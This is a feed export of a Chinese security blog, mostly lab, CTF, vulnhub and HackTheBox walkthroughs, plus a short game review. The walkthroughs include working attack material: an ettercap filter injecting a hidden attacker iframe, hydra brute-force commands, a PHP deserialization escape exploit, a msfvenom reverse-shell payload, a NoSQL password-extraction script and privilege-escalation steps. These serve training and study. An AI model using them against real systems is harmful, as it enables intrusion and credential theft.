        <content type="html"><![CDATA[<h2 id="任务一-使用nmap-ettercap进行网络侦查和密码嗅探"><a href="#任务一-使用nmap-ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务一  使用nmap,ettercap进行网络侦查和密码嗅探"></a>任务一  使用nmap,ettercap进行网络侦查和密码嗅探</h2><p>ettercap使用</p><p>常用参数</p><ul><li>-l 显示可用网卡</li><li>-i 选择网卡</li><li>-t 协议选择，tcp/udp/all</li><li>-p 不进行毒化攻击，只用来嗅探</li><li>-F 载入过滤器文件</li><li>-V text 将数据包以文本形式显示在屏幕上</li></ul><p><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</p><p>具体到这个实验，需要使用ettercap去捕获ftp登陆的用户名和口令。其中，192.168.1.3 开放了ftp端口，所以尝试多次之后</p><pre><code>ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</code></pre><p><img src="/posts/ea51772/Image.png" alt></p><p>然后就抓到密码了</p><p><img src="/posts/ea51772/Image-1583392370959.png" alt></p><p>ettercap过滤脚本：</p><pre><code> if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.dst == 80 || tcp.dst == 8080) {      #...and if it contains an Accept-Encoding header...      if (search(DATA.data, &quot;Accept-Encoding&quot;)) {      #...remove any Encoding (make sure we are using plain text)      replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing!&quot;);        }    }    #--Inject Iframe--    if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.src == 80 || tcp.src == 8080) {       if (search(DATA.data, &quot;&lt;body&gt;&quot;)){           #Replace it with the body tag and an iframe to our attacking webpage           replace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&lt;iframe src=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;body&gt;\n&quot;);       }       if (search(DATA.data, &quot;&lt;BODY&gt;&quot;)){           replace(&quot;&lt;BODY&gt;&quot;,&quot;&lt;BODY&gt;&lt;IFRAME SRC=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;BODY&gt;\n&quot;);       }   }</code></pre><p>第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。</BODY></body></p><p>基本语法</p><pre><code>Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。编译过滤规则的命令是：etterfilter filter.ecf -o filter.ef。即把filter.ecf文件编译成ettercap能识别的filter.ef文件。过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号{}不能省略。Ettercap提供的一些常用的函数有：search(where, what) 从字符串where中查找what，若找到则返回trueregex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回truereplace(what, with) 把字符串what替换成字符串withlog(what, where) 把字符串what记录到where文件中msg(message) 在屏幕上显示出字符串messageexit() 退出</code></pre><p>（当然这里不用这么复杂啦</p><h2 id="任务二-使用crunch，hydra暴力破解ssh服务"><a href="#任务二-使用crunch，hydra暴力破解ssh服务" class="headerlink" title="任务二 使用crunch，hydra暴力破解ssh服务"></a>任务二 使用crunch，hydra暴力破解ssh服务</h2><p>crunch的基本用法</p><p>*　　-b #体积大小，比如后跟20mib<br>*　　-c #密码个数（行数），比如8000<br>*　　-d #限制出现相同元素的个数（即至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的<br>*　　-e #定义停止生成密码 ，比如-e 222222：到222222停止生成密码<br>*　　-f #调用密码库文件，比如/usr/share/crunch/charset.lst<br>*　　-i #改变输出格式<br>*　　-l #与-t搭配使用<br>*　　-m #与-p搭配使用<br>*　　-o #保存为<br>*　　-p #定义密码元素<br>*　　-q #读取字典<br>*　　-r #定义从某一个地方重新开始<br>*　　-s #第一个密码，从xxx开始<br>*　　-t #定义输出格式</p><p>hydra爆破的用法</p><ul><li>破解ssh</li></ul><p><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</code></p><ul><li>破解ftp</li></ul><p><code>hydra ip ftp -l 用户名 -P 密码字典 -t线程(默认16) -vV</code></p><ul><li>破解rdp</li></ul><p><code>hydra ip rdp -l administrator -P pass.txt -V</code></p><ul><li>破解telnet</li></ul><p><code>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</code></p><p>当然这里我们直接社工吧。。hacker123</p><h2 id="任务三-使用ssh登陆"><a href="#任务三-使用ssh登陆" class="headerlink" title="任务三 使用ssh登陆"></a>任务三 使用ssh登陆</h2><p>不说了。。</p><h2 id="任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息</h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化导致字符的逃逸</title>
      <link href="/posts/bdd52bdc/"/>
      <url>/posts/bdd52bdc/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></p><p>这个点很神奇，</p><h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><pre><code class="php">&lt;?phpfunction filter($string){    return preg_match(&#39;/x/&#39;,&#39;yy&#39;,$string);}$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#39;\n&#39;;$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>这里将 <code>x</code> 替换为 <code>yy</code>,也就是变长了，正常的序列化数据为</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>如果我们可以控制用户名去修改密码，那么应该是这样的</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>(尤其注意这里的双引号)</p><p><code>peri0d</code> 长度为6，<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 长度为20</p><p>x替换为yy，长度由原来的1变为2，那么我们这里设填充为z,满足</p><p>6+20+z = 6+2z，得到的z就是20，所以填充x为20即可</p><pre><code class="php">$username = &quot;peri0d&quot;;$payload = &#39;&quot;;i:1;s:6:&quot;123456&quot;;}&#39;;$x = str_repeat(&quot;x&quot;,20);$username = $username.$x.$payload;$password = &quot;aaaaa&quot;;$user = array($username, $password);$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>结果</p><pre><code>&quot;a:2:{i:0;s:46:&quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&quot;array(2) {  [0] =&gt;  string(46) &quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;  [1] =&gt;  string(6) &quot;123456&quot;}</code></pre><h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2><p>安洵杯 easy_serialize_php</p><p>代码如下</p><pre><code class="php"> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));} </code></pre><p>flag 在 <code>d0g3_f1ag.php</code> 这个文件中</p><p><code>$_SESSION</code> 数组中有 <code>user, funciton, img</code> 这三个属性</p><p>最后读文件的文件名是 <code>$_SESSION[&#39;img&#39;]</code> ，如果能够控制这个属性就好了，但是</p><pre><code class="php">if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}</code></pre><p>显然 <code>sha1</code> 的数据你是没法控制的，那怎么搞呢</p><p>重点在这里</p><pre><code class="php">$serialize_info = filter(serialize($_SESSION));</code></pre><p>序列化之后经过了一次过滤</p><p>而 <code>extract($_POST);</code> 使得我们可以控制 <code>$_SESSION</code> 数组中的 <code>user</code> 和 <code>function</code></p><p>先测试一下正常的一段序列化字符：</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>能不能控制好user和function，使得加上一个我们控制好的img</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;};s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>这样反序列化的时候最后的那个 img属性就是多余的了，我们来计算一下怎么利用过滤来达到目的</p><pre><code class="php">&lt;?phpfunction filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;2333&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));// var_dump(unserialize($a));</code></pre><p>此时生成的是</p><pre><code>a:3:{s:4:&quot;user&quot;;s:4:&quot;2333&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>我们要让 <code>&quot;;s:8:&quot;function&quot;;s:61:&quot;a</code> 这段字符被吃掉，成为 <code>user</code> 的值，算一下长度24，正好是6个flag</p><p>所以</p><pre><code class="php">&lt;?phpfunction filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));var_dump(unserialize($a));</code></pre><p>这时候得到的结果</p><pre><code class="php">a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>再进行反序列化</p><pre><code>array(3) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;  &#39;img&#39; =&gt;  string(20) &quot;ZDBnM19mMWFnLnBocAo=&quot;  &#39;dd&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>可以看到成功地覆盖了img属性</p><p>ps,又测试了一下如果有两个img属性会怎么搞</p><pre><code class="php">$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:3:&quot;img&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;</code></pre><p>得到的结果是：</p><pre><code class="php">array(2) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:62:&quot;a&quot;  &#39;img&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>此时img属性被合并了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文明六玩后感</title>
      <link href="/posts/61b7ba22/"/>
      <url>/posts/61b7ba22/</url>
      
        <content type="html"><![CDATA[<p>完了一段的时间的文明六，（虽然才48个小时</p><p><img src="/posts/61b7ba22/1583294758274.png" alt></p><h2 id="总体感觉"><a href="#总体感觉" class="headerlink" title="总体感觉"></a>总体感觉</h2><p>一开始玩这个游戏有点不知所措，因为这个游戏的信息量实在是太大了，后来慢慢地从别人的视频中才逐渐的熟悉起来。</p><p>文明六大概分为几个部分吧，首先是最基本的城市，可以建造区域，练兵，造工人，开拓者。然后是</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-DC-8</title>
      <link href="/posts/24a0544e/"/>
      <url>/posts/24a0544e/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p><pre><code>PORT   STATE SERVICE  VERSION22/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)80/tcp open  ssl/http Apache|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache|_http-title: Welcome to DC-8 | DC-8MAC Address: 08:00:27:A8:B6:73 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>打开80端口发现是drupal,扫描到后台 <a href="http://192.168.56.102/user" target="_blank" rel="noopener">http://192.168.56.102/user</a> ，并且发现了可疑注入点</p><p><img src="/posts/24a0544e/1583216887452.png" alt></p><p>sqlmap注入</p><p><img src="/posts/24a0544e/1583217015158.png" alt></p><p>得到用户名和密码</p><pre><code>+-------+---------------------------------------------------------+| name  | pass                                                    |+-------+---------------------------------------------------------+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+-------+---------------------------------------------------------+</code></pre><p>不过密码是hash过的，使用john爆破，只有 <code>john</code> 用户的密码可以爆破出来 <code>turtle</code></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>修改页面</p><p><img src="/posts/24a0544e/1583217110935.png" alt></p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw  -o shell.php</code></pre><p>生成 shell ，修改</p><p><img src="/posts/24a0544e/1583217170125.png" alt></p><p>修改完之后，提交表单</p><p><img src="/posts/24a0544e/1583217222343.png" alt></p><p>成功getshell</p><p><img src="/posts/24a0544e/1583217261982.png" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 SUID</p><pre><code>www-data@dc-8:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null                     /usr/bin/chfn                                             /usr/bin/gpasswd                                          /usr/bin/chsh                                             /usr/bin/passwd                                           /usr/bin/sudo                                             /usr/bin/newgrp                                           /usr/sbin/exim4                                           /usr/lib/openssh/ssh-keysign                              /usr/lib/eject/dmcrypt-get-device                         /usr/lib/dbus-1.0/dbus-daemon-launch-helper               /bin/ping                                                 /bin/su                                                   /bin/umount                                               /bin/mount                                                </code></pre><p>发现了 <code>exim4</code> ,这是一个邮件程序</p><p>搜索相关的 exploit</p><p><img src="/posts/24a0544e/1583217430342.png" alt></p><p>将 <code>46996.sh</code> 上传到靶机上，注意需要修改一下文件格式为 <code>unix</code></p><pre><code>set ff=unix</code></pre><p><img src="/posts/24a0544e/1583217742979.png" alt></p><p>最后得到flag</p><p><img src="/posts/24a0544e/1583217755873.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB mango靶机实战</title>
      <link href="/posts/73230382/"/>
      <url>/posts/73230382/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><pre><code>staging-order.mango.htb</code></pre><p>访问网站</p><p><img src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><pre><code class="python">#!/usr/bin/env python  import requests  import string  url = &quot;http://staging-order.mango.htb/index.php&quot;  headers = {&quot;Host&quot;: &quot;staging-order.mango.htb&quot;}  cookies = {&quot;PHPSESSID&quot;: &quot;9k6j39np56td4vq3q4lg4eh95j&quot;}  possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]  def get_password(username):      print(&quot;Extracting password of &quot; + username)      params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}      password = &quot;^&quot;      while True:          for c in possible_chars:              params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;              pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)              if int(pr.status_code) == 302:                  password += c                  break          if c == possible_chars[-1]:              print (&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)              return password[1:].replace(&quot;\\&quot;, &quot;&quot;)  def get_usernames():      usernames = []      params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}      for c in possible_chars:          username = &quot;^&quot; + c          params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;          pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)          if int(pr.status_code) == 302:              print(&quot;Found username starting with &quot;+c)              while True:                  for c2 in possible_chars:                      params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                      if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                          username += c2                          print(username)                          break                  if c2 == possible_chars[-1]:                      print(&quot;Found username: &quot; +username[1:])                      usernames.append(username[1:])                      break      return usernames  for u in get_usernames():      get_password(u)  </code></pre><p>爆出密码</p><p><img src="/posts/73230382/1582967279320.png" alt></p><pre><code>Found username: mangoExtracting password of adminFound password t9KcS3&gt;!0B#2 for username adminExtracting password of mangoFound password h3mXK8RhU~f{]f5H for username mango</code></pre><p>使用mango用户登陆</p><p><img src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src="/posts/73230382/1582967301413.png" alt></p><pre><code>userflag$ cat user.txt79bf31c6c6eb38a8567832f7f8b47e92</code></pre><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src="/posts/73230382/1582967336806.png" alt></p><pre><code>find / -user root -perm -4000 2&gt;/dev/null</code></pre><p>寻找SUID</p><p><img src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src="/posts/73230382/1582967372531.png" alt></p><pre><code class="bash">Warning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader = Java.type(&quot;java.io.FIleReader&quot;);java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReaderjjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));jjs&gt; while((line=br.readline())!=null){print(line);}&lt;shell&gt;:1 TypeError: br.readline is not a functionjjs&gt; while((line=br.readLine())!=null){print(line);}8a8ef79a7a2fbb01ea81688424e9ab15</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Traverxec靶机实战</title>
      <link href="/posts/d5bfc2a3/"/>
      <url>/posts/d5bfc2a3/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><pre><code>cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</code></pre><p><img src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src="/posts/d5bfc2a3/1582966848699.png" alt></p><pre><code>david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3d</code></pre><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><pre><code class="bash">david@traverxec:~/bin$ cat server-stats.head                                                                                                                     .----.                                                                     .---------. | == |          Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|                Collection Script                                    ||       || | == |                 (c) David, 2019                                     ||       || |----|                                                                     |&#39;-.....-&#39;| |::::|                                                                     &#39;&quot;&quot;)---(&quot;&quot;&#39; |___.|                                                                    /:::::::::::\&quot;    &quot;                                                                   /:::=======:::\                                                                    jgs &#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;            david@traverxec:~/bin$ cat server-stats.sh                                             #!/bin/bash                                                                            cat /home/david/bin/server-stats.head                                                  echo &quot;Load: `/usr/bin/uptime`&quot;                                                         echo &quot; &quot;                                                                               echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;               echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;    echo &quot; &quot;                                                                               echo &quot;Last 5 journal log lines:&quot;                                                       /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat                </code></pre><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><pre><code># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</code></pre><p><img src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-最长回文字串</title>
      <link href="/posts/a99288c/"/>
      <url>/posts/a99288c/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-Connectthedots</title>
      <link href="/posts/e4ff8385/"/>
      <url>/posts/e4ff8385/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机渗透-Connectthedots"><a href="#vulnhub靶机渗透-Connectthedots" class="headerlink" title="vulnhub靶机渗透-Connectthedots"></a>vulnhub靶机渗透-Connectthedots</h1><p>目标：/home/user.txt and /root/root.txt</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>由于VMware会出现种种问题，于是改成了Virtual Box,而且Vulhub上的大部分靶机都是使用Virtual Box制作的</p><p>附上一些相关的配置截图：</p><p>kali 2019.04<br>第一块网卡没做修改</p><p>添加了第二块网卡<br><img src="/posts/e4ff8385/1576475770757.png" alt></p><p>vulnhub靶机渗透-Connectthedots作为靶机，同样添加了第二块网卡</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali IP ： 192.168.99.101<br><img src="/posts/e4ff8385/1576475827530.png" alt></p><p>通过nmap发现另一台主机(注意netdiscover和arp-scan都无法使用了)<br><img src="/posts/e4ff8385/1576475870118.png" alt></p><p>主机开放的所有服务：</p><p><img src="/posts/e4ff8385/1576476412907.png" alt></p><p>一个个来看</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>vsftp 服务， metasploit搜索payload</p><p>返回的信息：</p><pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 192.168.99.104:21 - Banner: 220 Welcome to Heaven![*] 192.168.99.104:21 - USER: 530 Permission denied.[-] 192.168.99.104:21 - This server is configured for anonymous only and the backdoor code cannot be reached[*] Exploit completed, but no session was created.</code></pre><p>尝试匿名登陆没有成功</p><p><img src="/posts/e4ff8385/1576476598073.png" alt></p><h2 id="80端口"><a 